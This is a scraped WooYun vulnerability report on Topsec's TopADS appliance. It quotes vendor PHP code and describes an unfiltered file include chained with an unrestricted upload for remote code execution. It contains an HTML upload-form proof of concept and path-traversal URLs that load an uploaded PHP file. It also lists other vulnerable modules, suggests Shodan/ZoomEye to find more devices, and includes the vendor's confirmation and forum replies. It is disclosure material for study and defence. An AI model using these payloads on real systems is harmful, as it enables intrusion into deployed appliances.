{"id": 87221, "wybug_id": "wooyun-2016-0178904", "wybug_title": "天融信TopADS文件包含导致多处代码执行漏洞", "wybug_corp": "天融信", "wybug_author": "老虎皮", "wybug_date": "2016-02-26 17:22", "wybug_open_date": "2016-05-29 10:00", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-02-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-02-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-03-03：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航、无声信息）\t\t\t\t\t\t\t\t\t2016-04-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-05-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-05-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-05-29：\t细节向公众公开  简要描述： 全部打包（13处）我是好孩子，我不吹牛逼，全部是rce，我详细分析，乌云，奖励来 详细说明：    偶尔撸到一套TopADS源码对其源码进行分析 \n\n \n\n 入口为libraries/Ngtos.class.php \n\n  入口函数为run()  为mvc架构   参数为：module  action \n$module = trim($_REQUEST['module']) ? trim($_REQUEST['module']) : 'login';        $action = trim($_REQUEST['action']) ? trim($_REQUEST['action']) : '';        if ($module == 'home' || $module == 'main' || $module == 'login' || $module == 'logout' || $module == 'password') {            $action = $module;            $module = 'page_frame';        }        if ($offset = @strpos($module, '_')) {            $folder = substr($module, 0, $offset);            $file = substr($module, $offset + 1);            $filename = ROOTPATH . '/modules/' . $folder . '/' . $file . '.mds.php';            if (!file_exists($filename)) {                $filename = ROOTPATH . '/modules/' . $folder . '/' . $file . '.php';            }        } else {            $filename = ROOTPATH . '/modules/' . $module . '.mds.php';            if (!file_exists($filename)) {                $filename = ROOTPATH . '/modules/' . $module . '.php';            }        }        if (!file_exists($filename)) {            die('Not Found');        }        require_once $filename;\n$module变量未经过过滤，导致可以使用../这样的跳转字符，但是后缀又是.mds.php或者.php文件，所以我们也没发包含其他文件，例如有人会说了，截断？ 但是这里php版本以及gpc影响，截断不成功，所以这条路行不通。接下来再看我一步步分析我接下来分析其中一例，其他的留厂商逐个去修复在系统system/upload.mds.php中\nelse if ($action == 'local_import') {    /* if ($_FILES[\"file\"][\"error\"] > 0)      {      include template('system_upload_file');      return;      } */    if (!empty($_FILES[\"file\"][\"error\"])) {        switch ($_FILES[\"file\"]['error']) {            case '1':                $error = 'The uploaded file exceeds the upload_max_filesize directive in php.ini';                break;            case '2':                $error = 'The uploaded file exceeds the MAX_FILE_SIZE directive that was specified in the HTML form';                break;            case '3':                $error = 'The uploaded file was only partially uploaded';                break;            case '4':                $error = 'No file was uploaded.';                break;            case '6':                $error = 'Missing a temporary folder';                break;            case '7':                $error = 'Failed to write file to disk';                break;            case '8':                $error = 'File upload stopped by extension';                break;            case '999':            default:                $error = 'No error code avaiable';        }        echo $error;    } else if (empty($_FILES['file']['tmp_name']) || $_FILES['file']['tmp_name'] == 'none') {        $error = 'No file was uploaded......';        echo $error;    } else {        $param['filename'] = $_FILES[\"file\"][\"name\"];        $newfilename = \"/tmp/\" . $_FILES[\"file\"][\"name\"];        if ($_POST['des'])            $param['comments'] = formatpost($_POST['des']);        if (move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], $newfilename)) {            $rspString = getResponse('system firmware', \"webimport\", $param, 2);            if (is_numeric($rspString) && $rspString == 0) {                echo 'ok';            } else {                echo $rspString;            }        } else {            include template('system_upload_file');        }    }\n 这里我们可以看到最终写入动作 \nmove_uploaded_file($_FILES[\"file\"][\"tmp_name\"], $newfilename\n其中 $newfilename为路径\n$newfilename = \"/tmp/\" . $_FILES[\"file\"][\"name\"];\n这里$_FILES[\"file\"][\"name\"] 即我们的文件名，有人就说了，那这样文件名可控我们直接跳转写到web目录？事实上我已经测过了，他本身有过滤，文件名过滤了../这样的字符，只能老老实实的写文件名所以这里对后缀也没限制，所以我们直接就可以写个php了构造如下poc\n<form action=\"**.**.**.**/index.php?module=system_config&action=importHandle\" method=\"post\" enctype=\"multipart/form-data\">\t    <input type=\"file\" name=\"file\">        <input type=\"submit\" name=\"dosubmit\" value=\"上传\" style=\"margin-top:5px; height:28px;\">    </form>\n 所以我们的恶意代码就写入了/tmp目录了所以结合第一步我们的跳转，我们只要**.**.**.**/index.php?module=../../../../../tmp/文件名例如我们传的文件名为testwooyun.php我们连接的时候就用**.**.**.**/index.php?module=../../../../../tmptestwooyun其他处在以下列表auth/localCaPki.mds.phpauth/peerPki.mds.phpauth/pki.mds.phpsystem/config.mds.phpauth/thirdPki.mds.phpauth/user.mds.phpsystem/rules.mds.phpads/ads_staticblist.phpads/ads_staticwlist.phpads/policy_defence.mds.php其中ads/ads_staticblist.php  可以直接shell因为直接传到web目录了\nif ($action == \"import\") {51         $upFilePath = \"/usr/local/apache2/htdocs/attachements/\";52         if ($_FILES['file']['size'] > 819200) {   //可输入变量$_FILES 可能存在安全威胁53             echo json_encode(array('file_infor' => 'error:上传失败,文件过大,最大800K'));54             return;55         }56         $ok=@move_uploaded_file($_FILES['file']['tmp_name'], $upFilePath.$_FILES['file']['name']);   //可输入变量$_FILES 可能存在安全威胁57         if($ok === FALSE){58             echo json_encode(array('file_infor' => 'error:上传失败'));59         } else {60             $err = \"\";61             $fp = fopen($upFilePath.$_FILES['file']['name'], \"r\");   //可输入变量$_FILES 可能存在安全威胁62             while($line = fgets($fp)) {63                 $param['whitelist'] =  formatpost($line);64                 $rspString = getResponse(\"ddos global\", \"add\", $param, 2);65                 if (is_string($rspString)) {66                     $err = $rspString;67                 } else{68                     $sql = \"INSERT INTO ads_static_wlist values\".\"('\".formatpost($line).\"') \";69                     $db->query($sql);70                 }71             }\n\n\n我给出通杀案例：**.**.**.**//index.php?module=../../../../../tmp/testwooyun**.**.**.**//index.php?module=../../../../../tmp/testwooyun**.**.**.**/index.php?module=../../../../../tmp/testwooyun**.**.**.**//index.php?module=../../../../../tmp/testwooyun**.**.**.**/index.php?module=../../../../../tmp/testwooyun**.**.**.**/index.php?module=../../../../../tmp/testwooyun**.**.**.**/index.php?module=../../../../../tmp/testwooyun.....其他的请去撒旦上找，或者钟馗之眼上找吧，天融信这套很多。。。    漏洞证明：  因为直接传到web目录了\nif ($action == \"import\") {51         $upFilePath = \"/usr/local/apache2/htdocs/attachements/\";52         if ($_FILES['file']['size'] > 819200) {   //可输入变量$_FILES 可能存在安全威胁53             echo json_encode(array('file_infor' => 'error:上传失败,文件过大,最大800K'));54             return;55         }56         $ok=@move_uploaded_file($_FILES['file']['tmp_name'], $upFilePath.$_FILES['file']['name']);   //可输入变量$_FILES 可能存在安全威胁57         if($ok === FALSE){58             echo json_encode(array('file_infor' => 'error:上传失败'));59         } else {60             $err = \"\";61             $fp = fopen($upFilePath.$_FILES['file']['name'], \"r\");   //可输入变量$_FILES 可能存在安全威胁62             while($line = fgets($fp)) {63                 $param['whitelist'] =  formatpost($line);64                 $rspString = getResponse(\"ddos global\", \"add\", $param, 2);65                 if (is_string($rspString)) {66                     $err = $rspString;67                 } else{68                     $sql = \"INSERT INTO ads_static_wlist values\".\"('\".formatpost($line).\"') \";69                     $db->query($sql);70                 }71             }\n\n\n我给出通杀案例：**.**.**.**//index.php?module=../../../../../tmp/testwooyun**.**.**.**//index.php?module=../../../../../tmp/testwooyun**.**.**.**/index.php?module=../../../../../tmp/testwooyun**.**.**.**//index.php?module=../../../../../tmp/testwooyun**.**.**.**/index.php?module=../../../../../tmp/testwooyun**.**.**.**/index.php?module=../../../../../tmp/testwooyun**.**.**.**/index.php?module=../../../../../tmp/testwooyun.....其他的请去撒旦上找，或者钟馗之眼上找吧，天融信这套很多。。。    修复方案：     版权声明：转载请注明来源 老虎皮@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2016-02-29 09:58 厂商回复： 已确认，谢谢提交 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-02-26 17:43 |    \t\tzeracker  \t\t\t( 普通白帽子  |\t\t\t        Rank:1077 漏洞数:139        | 爱吃小龙虾。)\t\t \n  全部打包（13处）我是好孩子，我不吹牛逼，全部是rce，我详细分析，乌云，奖励来    \n     2016-02-26 17:48 |    \t\t狗狗侠  \t\t\t( 普通白帽子  |\t\t\t        Rank:518 漏洞数:58        | 我是狗狗侠)\t\t \n  全部打包（13处）我是好孩子，我不吹牛逼，全部是rce，我详细分析，乌云，奖励来     \n     2016-02-26 17:48 |    \t\t玉林嘎  \t\t\t( 普通白帽子  |\t\t\t        Rank:941 漏洞数:108        )\t\t \n  全部打包（13处）我是好孩子，我不吹牛逼，全部是rce，我详细分析，乌云，奖励来    \n     2016-02-26 17:59 |    \t\t盛大网络(乌云厂商)\t\t \n  @xfkxfk    \n     2016-02-26 18:04 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:265 漏洞数:33        | 开发真是日了狗了)\t\t \n  日穿了。。    \n     2016-02-26 18:20 |    \t\tzeracker  \t\t\t( 普通白帽子  |\t\t\t        Rank:1077 漏洞数:139        | 爱吃小龙虾。)\t\t \n  @盛大网络 .....    \n     2016-02-26 18:34 |    \t\t坏男孩-A_A \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:23        | 膜拜学习中)\t\t \n  全部打包（13处）我是好孩子，我不吹牛逼，全部是rce，我详细分析，乌云，奖励来    \n     2016-02-26 18:38 |    \t\tCoody  \t\t\t( 核心白帽子 |\t\t\t        Rank:1809 漏洞数:214        | 不接单、不黑产；如遇冒名顶替接单收徒、绝...)\t\t \n  猜猜洞主是谁？    \n     2016-02-27 13:01 |    \t\txfkxfk  \t\t\t( 核心白帽子 |\t\t\t        Rank:2327 漏洞数:352        | 呵呵！)\t\t \n  @盛大网络     \n     2016-03-03 10:26 |    \t\t1c3z \t\t\t( 普通白帽子  |\t\t\t        Rank:297 漏洞数:64        | @)!^)\t\t \n  不吹不黑。。    \n     2016-03-03 14:18 |    \t\txfkxfk  \t\t\t( 核心白帽子 |\t\t\t        Rank:2327 漏洞数:352        | 呵呵！)\t\t \n  这个系统没办法截断，我才是上传php文件然后再包含的    \n     2016-03-03 14:28 |    \t\tanting \t\t\t( 普通白帽子  |\t\t\t        Rank:105 漏洞数:38        | 活到老，学到老)\t\t \n  全部打包（13处）我是好孩子，我不吹牛逼，全部是rce，我详细分析，乌云，奖励来    \n     2016-03-03 17:29 |    \t\t大师兄 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:8        | 每日必关注乌云)\t\t \n  全部打一个包（头上13处）我是坏孩子，我不吹牛逼，全部是rce，我详细分析，乌云，奖励来    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}